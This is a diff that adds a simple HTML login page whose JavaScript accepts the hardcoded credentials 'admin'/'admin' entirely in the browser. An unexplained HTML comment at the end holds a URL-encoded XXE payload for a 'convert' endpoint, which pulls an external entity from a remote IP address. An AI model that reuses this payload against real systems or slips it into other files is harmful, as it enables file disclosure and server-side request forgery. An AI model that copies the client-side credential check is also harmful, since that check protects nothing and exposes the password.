@@ -1,0 +1,23 @@
+<html>
+<body>
+<form >
+<input type="text" name="username" /><br><br>
+<input type="password" name="password"/><br><br>
+<input type="button" value="Login" onClick="display(this.form)"/>
+
+</form>
+<script type="text/javascript">
+function display(form){
+if (form.username.value=="admin") { 
+		if (form.password.value=="admin") {              
+										location="page2.html" 
+											} else {
+													alert("Invalid Password")
+													}
+								} else {  alert("Invalid Username")
+										}
+						}
+			</script>
+</body>
+</html>
+<!-- convert?xml=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+"http%3a//139.59.47.34/ev.xml">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123 -->
